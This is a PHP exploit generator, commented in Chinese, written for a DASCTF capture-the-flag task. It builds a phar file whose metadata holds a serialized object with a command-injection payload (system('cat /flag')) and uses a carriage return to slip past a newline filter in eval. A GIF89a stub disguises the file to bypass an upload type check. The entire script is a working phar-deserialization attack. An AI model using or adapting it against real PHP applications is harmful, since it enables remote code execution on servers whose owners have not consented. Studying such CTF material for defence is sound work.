#!/usr/bin/env php
<?php
/**
 * DASCTF 第七题 Phar 文件生成器
 * 
 * 生成含 Evil 对象的 phar 文件, 用于 phar 反序列化攻击
 * 
 * 用法: php -d phar.readonly=0 gen_phar.php [输出文件]
 */

$output = $argv[1] ?? '/tmp/evil.phar';
@unlink($output);

$phar = new Phar($output);
$phar->startBuffering();
$phar->addFromString("test.txt", "test");

class Evil {
    public $cmd;
}

$evil = new Evil();
// \r (0x0d) 绕过 eval 中的 # 单行注释
// 正则只过滤 \n (0x0a), 不过滤 \r (0x0d)
// system 不含被过滤关键词 (> < ? php)
$evil->cmd = chr(13) . "system('cat /flag');";

$phar->setMetadata($evil);
// GIF89a 头绕过文件上传类型检查
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->stopBuffering();

echo "Phar 文件生成成功: $output\n";
echo "文件大小: " . filesize($output) . " bytes\n";
echo "Payload cmd hex: " . bin2hex($evil->cmd) . "\n";

// 验证
$p = new Phar($output);
$meta = $p->getMetadata();
echo "验证 cmd: " . bin2hex($meta->cmd) . " (len=" . strlen($meta->cmd) . ")\n";
